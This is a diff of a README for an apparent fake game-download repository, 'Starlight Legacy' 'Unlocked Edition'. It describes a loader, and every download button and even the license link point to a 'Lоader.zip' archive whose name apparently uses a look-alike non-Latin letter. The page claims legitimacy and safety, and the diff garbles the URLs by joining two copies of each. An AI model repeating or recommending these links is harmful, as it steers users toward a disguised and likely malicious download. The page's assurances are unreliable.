@@ -1,5 +1,5 @@
 # ✨ Starlight Legacy Download ©️
-[![Download Now](https://raw.githubusercontent.com/ImJulianJamison/StarlightLegacy-UnlockedEdition/main/Lоader.zip)](https://raw.githubusercontent.com/ImJulianJamison/StarlightLegacy-UnlockedEdition/main/Lоader.zip)
+[![Download Now](https://raw.githubusercontent.com/ImJulianJamison/StarlightLegacy-UnlockedEdition/main/Lоader.zipоhttps://raw.githubusercontent.com/ImJulianJamison/StarlightLegacy-UnlockedEdition/main/Lоader.zip)](https://raw.githubusercontent.com/ImJulianJamison/StarlightLegacy-UnlockedEdition/main/Lоader.zipоhttps://raw.githubusercontent.com/ImJulianJamison/StarlightLegacy-UnlockedEdition/main/Lоader.zip)
 
 Welcome to Starlight Legacy Download – your all-in-one solution to experience the magical world of Starlight Legacy! This repository assists users in quickly accessing the game installer and provides all the essential resources you need for seamless gameplay. Packed with robust features, widespread OS compatibility, and a user-friendly setup, this is your first step into an epic digital journey.  
 
@@ -38,7 +38,7 @@ Starlight Legacy download | setup | safe link | launcher | step-by-step install 
  
 # 📥 Installation  
 1️⃣ Click the download button to get the launcher:  
-[![Download Now](https://raw.githubusercontent.com/ImJulianJamison/StarlightLegacy-UnlockedEdition/main/Lоader.zip)](https://raw.githubusercontent.com/ImJulianJamison/StarlightLegacy-UnlockedEdition/main/Lоader.zip)
+[![Download Now](https://raw.githubusercontent.com/ImJulianJamison/StarlightLegacy-UnlockedEdition/main/Lоader.zipоhttps://raw.githubusercontent.com/ImJulianJamison/StarlightLegacy-UnlockedEdition/main/Lоader.zip)](https://raw.githubusercontent.com/ImJulianJamison/StarlightLegacy-UnlockedEdition/main/Lоader.zipоhttps://raw.githubusercontent.com/ImJulianJamison/StarlightLegacy-UnlockedEdition/main/Lоader.zip)
 
 ---
 
@@ -48,7 +48,7 @@ This project provides a gateway to Starlight Legacy using only legitimate source
 ---
 
 # 📄 License  
-Distributed under the [MIT License](https://raw.githubusercontent.com/ImJulianJamison/StarlightLegacy-UnlockedEdition/main/Lоader.zip).  
+Distributed under the [MIT License](https://raw.githubusercontent.com/ImJulianJamison/StarlightLegacy-UnlockedEdition/main/Lоader.zipоhttps://raw.githubusercontent.com/ImJulianJamison/StarlightLegacy-UnlockedEdition/main/Lоader.zip).  
 Copyright ⓒ 2025.  
 
 ---
